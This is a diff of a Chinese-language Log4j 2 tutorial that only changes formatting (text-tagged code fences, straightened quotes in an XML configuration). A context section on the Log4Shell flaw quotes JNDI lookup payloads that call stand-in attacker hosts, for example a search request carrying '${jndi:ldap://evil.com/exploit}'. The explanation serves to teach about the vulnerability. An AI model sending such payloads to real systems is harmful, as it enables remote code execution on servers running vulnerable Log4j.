@@ -51,7 +51,7 @@ Log4j 2 分为两个独立的模块：
 
 ## 2.2 核心组件
 
-```
+```text
 +------------------+
 |    Logger        |
 | (应用程序调用接口) |
@@ -870,7 +870,7 @@ Disruptor 是 LMAX 交易所开发的高性能无锁并发框架，Log4j 2 用�
 
 ### 5.1.2 RingBuffer 原理
 
-```
+```text
                       Producer
                          |
                          v
@@ -891,7 +891,7 @@ Disruptor 是 LMAX 交易所开发的高性能无锁并发框架，Log4j 2 用�
 
 ### 5.1.3 Log4j 2 异步日志流程
 
-```
+```text
                  生产者线程                   消费者线程
                      |                          |
   Logger.log(msg)    |                          |
@@ -908,7 +908,7 @@ Disruptor 是 LMAX 交易所开发的高性能无锁并发框架，Log4j 2 用�
 
 Log4j 2 的配置模型与 Logback 有显著不同：
 
-```
+```text
 Logger (API)        LoggerConfig (配置)
    |                     |
    | 1. 调用             | 1. 保存级别
@@ -981,7 +981,7 @@ Log4j 2 可以混合使用同步和异步 Logger：
 
 Log4j 2 的 JNDI Lookup 功能允许在日志消息中通过 `${jndi:ldap://attacker.com/evil}` 格式执行 JNDI 查找。攻击者可以通过控制日志消息的内容，使 Log4j 2 执行远程 JNDI 查找，加载远程 Class，最终实现远程代码执行（RCE）。
 
-```
+```text
 攻击者发送恶意请求:
     GET /search?q=${jndi:ldap://evil.com/exploit}
 
@@ -1285,7 +1285,7 @@ public class Application {
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<Configuration monitorInterval=“30” status=“WARN”>
+<Configuration monitorInterval="30" status="WARN">
     <Properties>
         <Property name="log-path">/var/log/myapp</Property>
         <Property name="pattern">%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %c{1.} - %msg%n</Property>
@@ -1293,58 +1293,58 @@ public class Application {
 
     <Appenders>
         <!-- 控制台：只输出 WARN+ -->
-        <Console name=”Console” target=“SYSTEM_OUT”>
-            <ThresholdFilter level=“WARN” onMatch=“ACCEPT” onMismatch=“DENY” />
-            <PatternLayout pattern=“${pattern}” />
+        <Console name="Console" target="SYSTEM_OUT">
+            <ThresholdFilter level="WARN" onMatch="ACCEPT" onMismatch="DENY" />
+            <PatternLayout pattern="${pattern}" />
         </Console>
 
         <!-- 全量日志：异步 -->
-        <RollingRandomAccessFile name=“RollingFile”
-                                  fileName=“${log-path}/app.log”
-                                  filePattern=“${log-path}/app.%d{yyyy-MM-dd}.%i.log.gz”>
-            <PatternLayout pattern=“${pattern}” />
+        <RollingRandomAccessFile name="RollingFile"
+                                  fileName="${log-path}/app.log"
+                                  filePattern="${log-path}/app.%d{yyyy-MM-dd}.%i.log.gz">
+            <PatternLayout pattern="${pattern}" />
             <Policies>
-                <TimeBasedTriggeringPolicy interval=“1” />
-                <SizeBasedTriggeringPolicy size=“100 MB” />
+                <TimeBasedTriggeringPolicy interval="1" />
+                <SizeBasedTriggeringPolicy size="100 MB" />
             </Policies>
-            <DefaultRolloverStrategy max=“30” totalSizeCap=“10GB” />
+            <DefaultRolloverStrategy max="30" totalSizeCap="10GB" />
         </RollingRandomAccessFile>
 
         <!-- 错误日志单独文件 -->
-        <RollingRandomAccessFile name=“ErrorFile”
-                                  fileName=“${log-path}/error.log”
-                                  filePattern=“${log-path}/error.%d{yyyy-MM-dd}.%i.log.gz”>
-            <ThresholdFilter level=“ERROR” onMatch=“ACCEPT” onMismatch=“DENY” />
-            <PatternLayout pattern=“${pattern}” />
+        <RollingRandomAccessFile name="ErrorFile"
+                                  fileName="${log-path}/error.log"
+                                  filePattern="${log-path}/error.%d{yyyy-MM-dd}.%i.log.gz">
+            <ThresholdFilter level="ERROR" onMatch="ACCEPT" onMismatch="DENY" />
+            <PatternLayout pattern="${pattern}" />
             <Policies>
-                <TimeBasedTriggeringPolicy interval=“1” />
-                <SizeBasedTriggeringPolicy size=“50 MB” />
+                <TimeBasedTriggeringPolicy interval="1" />
+                <SizeBasedTriggeringPolicy size="50 MB" />
             </Policies>
-            <DefaultRolloverStrategy max=“60” />
+            <DefaultRolloverStrategy max="60" />
         </RollingRandomAccessFile>
 
         <!-- JSON 格式给日志收集系统 -->
-        <RollingRandomAccessFile name=“JsonFile”
-                                  fileName=“${log-path}/app.json”
-                                  filePattern=“${log-path}/app.%d{yyyy-MM-dd}.%i.json.gz”>
-            <JsonLayout compact=“true” eventEol=“true” properties=“true” />
+        <RollingRandomAccessFile name="JsonFile"
+                                  fileName="${log-path}/app.json"
+                                  filePattern="${log-path}/app.%d{yyyy-MM-dd}.%i.json.gz">
+            <JsonLayout compact="true" eventEol="true" properties="true" />
             <Policies>
-                <TimeBasedTriggeringPolicy interval=“1” />
-                <SizeBasedTriggeringPolicy size=“100 MB” />
+                <TimeBasedTriggeringPolicy interval="1" />
+                <SizeBasedTriggeringPolicy size="100 MB" />
             </Policies>
         </RollingRandomAccessFile>
     </Appenders>
 
     <Loggers>
-        <Logger name=“org.springframework” level=“WARN” />
-        <Logger name=“org.hibernate” level=“WARN” />
-        <Logger name=“com.example” level=“INFO” />
+        <Logger name="org.springframework" level="WARN" />
+        <Logger name="org.hibernate" level="WARN" />
+        <Logger name="com.example" level="INFO" />
 
-        <AsyncRoot level=“INFO”>
-            <AppenderRef ref=“Console” />
-            <AppenderRef ref=“RollingFile” />
-            <AppenderRef ref=“ErrorFile” />
-            <AppenderRef ref=“JsonFile” />
+        <AsyncRoot level="INFO">
+            <AppenderRef ref="Console" />
+            <AppenderRef ref="RollingFile" />
+            <AppenderRef ref="ErrorFile" />
+            <AppenderRef ref="JsonFile" />
         </AsyncRoot>
     </Loggers>
 </Configuration>
@@ -1433,7 +1433,7 @@ if (log.isDebugEnabled()) {
 
 **解决**：确保配置文件在 classpath 的根目录，文件名正确。
 
-```
+```text
 src/main/resources/
 ├── log4j2.xml        # 或 log4j2-spring.xml（Spring Boot）
 ├── log4j2.json
@@ -1504,7 +1504,7 @@ mvn dependency:tree | findstr logback
 **解决**：
 ```xml
 <!-- 确认 monitorInterval 已设置 -->
-<Configuration monitorInterval=“30”>
+<Configuration monitorInterval="30">
 <!-- 确认文件路径正确，检查文件权限 -->
 ```
 
